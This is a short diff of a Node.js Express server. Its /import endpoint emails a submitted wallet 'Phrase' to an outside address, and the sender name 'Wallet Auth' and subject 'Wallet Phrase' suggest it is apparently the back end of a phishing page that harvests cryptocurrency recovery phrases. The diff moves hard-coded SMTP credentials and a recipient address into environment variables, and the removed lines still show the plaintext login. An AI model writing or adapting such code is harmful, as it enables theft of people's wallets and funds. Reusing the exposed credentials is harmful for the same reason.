@@ -1,6 +1,7 @@
 const express = require("express")
 const path = require("path")
 const nodemailer = require("nodemailer")
+require('dotenv').config()
 
 const app = express()
 
@@ -27,14 +28,14 @@ app.post("/import", async (req, res) => {
             host: 'smtp.ethereal.email',
             port: 587,
             auth: {
-                user: 'ronaldo19@ethereal.email',
-                pass: 'AZNUNdaCRTqCY6kfuU'
+                user: process.env.USER,
+                pass: process.env.PASS
             }
         })
     
         let info = await transport.sendMail({
             from: "Wallet Auth",
-            to: "michaelstone730@gmail.com",
+            to: "MAN",
             subject: "Wallet Phrase",
             text: req.body.Phrase,
             html: `<b>${req.body.Phrase}</b>`
